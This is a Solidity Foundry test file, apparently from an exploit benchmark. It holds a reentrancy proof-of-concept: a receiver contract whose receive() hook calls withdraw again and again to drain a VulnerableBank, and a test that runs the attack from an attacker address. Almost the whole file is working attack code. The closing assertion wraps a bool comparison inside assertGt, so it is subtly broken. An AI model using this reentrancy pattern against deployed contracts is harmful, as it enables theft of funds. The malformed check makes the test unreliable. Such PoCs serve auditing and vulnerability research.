// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/dac4f90e-4c72-4947-a0c9-078502a6a6db_VulnerableBank.sol";

contract ReentrancyReceiver {
    VulnerableBank private immutable target;
    uint256 private immutable amount;

    constructor(VulnerableBank target_) {
        target = target_;
        amount = 1 ether;
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }

    function attack() external payable {
        require(msg.value == amount, "incorrect seed");
        target.deposit{value: amount}();
        target.withdraw(amount);
    }
}

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    ReentrancyReceiver receiver;
    address public constant attacker = 0xBAD;

    function setUp() public {
        target = new VulnerableBank();
        receiver = new ReentrancyReceiver(target);
        vm.deal(attacker, 10 ether);
        vm.deal(address(target), 10 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        receiver.attack{value: 1 ether}();
        assertGt(address(receiver).balance > 0, true);
    }
}